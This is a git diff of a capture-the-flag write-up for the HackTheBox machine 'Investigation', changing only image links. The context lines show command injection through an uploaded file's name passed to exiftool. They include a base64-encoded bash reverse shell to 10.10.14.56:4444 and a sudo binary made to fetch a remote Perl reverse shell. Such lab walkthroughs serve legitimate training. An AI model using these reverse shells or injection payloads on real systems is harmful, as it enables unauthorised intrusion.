@@ -22,19 +22,19 @@ Web Exploit based. We would have to add `eforenzics.htb` to our `/etc/hosts` fil
 
 The website reveals some web application advertising Digital Forensic Services.
 
-![](<../../../.gitbook/assets/image%20(4015).png>)
+![](../../../.gitbook/assets/investigation-10.png)
 
 Clicking the big Go button reveals that we can upload a jpg file to the website for analysis.
 
-![](<../../../.gitbook/assets/image%20(2836).png>)
+![](../../../.gitbook/assets/investigation-8.png)
 
 When I uploada file, it would produce a link to a report.
 
-![](<../../../.gitbook/assets/image%20(3516).png>)
+![](../../../.gitbook/assets/investigation-9.png)
 
 The file would be a .txt file of output from `exiftool` being used on the file.
 
-![](<../../../.gitbook/assets/image%20(1925).png>)
+![](../../../.gitbook/assets/investigation-4.png)
 
 Very obviously, there is a JPG RCE vulnerability here. One possible parameter to inject commands in is the File Name. With the version, I found this vulnerability that allowed for RCE through the pipe character.
 
@@ -42,9 +42,9 @@ Very obviously, there is a JPG RCE vulnerability here. One possible parameter to
 
 From this, I attempted a few direct OS command injections but it didn't work out well. I then attempted some Base64 encoded stuff, and a simple ping command works!
 
-![](<../../../.gitbook/assets/image%20(725).png>)
+![](../../../.gitbook/assets/investigation-12.png)
 
-![](<../../../.gitbook/assets/image%20(1713).png>)
+![](../../../.gitbook/assets/investigation-3.png)
 
 We can then replace the Base64 encoded command with a simple bash reverse shell and it works!
 
@@ -53,7 +53,7 @@ $ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.56/4444 0>&1"  ' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni80NDQ0IDA+JjEiICAK
 ```
 
-![](<../../../.gitbook/assets/image%20(2344).png>)
+![](../../../.gitbook/assets/investigation-6.png)
 
 ## Privilege Escalation
 
@@ -69,7 +69,7 @@ drwxrwx---  3 smorton smorton 4096 Jan  9 10:47 smorton
 
 We need to do some looking around. I ran LinPEAS and found an interesting cronjob that was running.
 
-![](<../../../.gitbook/assets/image%20(1276).png>)
+![](../../../.gitbook/assets/investigation-1.png)
 
 Some backups of the `/home` directory were being created, and also there was an unquoted service path for the `date` binary.
 
@@ -105,7 +105,7 @@ I couldn't decode the base64 to get the file for some reason, so I ported the me
 
 When unzipped, we would get this MS Windows Vista Event Log.
 
-![](<../../../.gitbook/assets/image%20(479).png>)
+![](../../../.gitbook/assets/investigation-11.png)
 
 So the key here is to watch for logging and file transfers that are occurring. We can use this tool to dump the log file into a JSON file for easier reading.
 
@@ -113,7 +113,7 @@ So the key here is to watch for logging and file transfers that are occurring. W
 
 After looking around the entire log file (for a while), I chanced upon this string when searching for the Authentication term.
 
-![](<../../../.gitbook/assets/image%20(2781).png>)
+![](../../../.gitbook/assets/investigation-7.png)
 
 Turns out that this was the password for `smorton`. We can now `su` and capture the user flag.
 
@@ -140,7 +140,7 @@ Exiting...
 
 So I transferred this binary back to my machine and used `ghidra` to see what it does. Here's the decompiled main function:
 
-![](<../../../.gitbook/assets/image%20(1689).png>)
+![](../../../.gitbook/assets/investigation-2.png)
 
 We can use this to get these this information:
 
@@ -162,6 +162,6 @@ smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.56/rev.perl lDnxUy
 Running...
 ```
 
-![](<../../../.gitbook/assets/image%20(2074).png>)
+![](../../../.gitbook/assets/investigation-5.png)
 
 Definitely more on the CTF side of HTB.
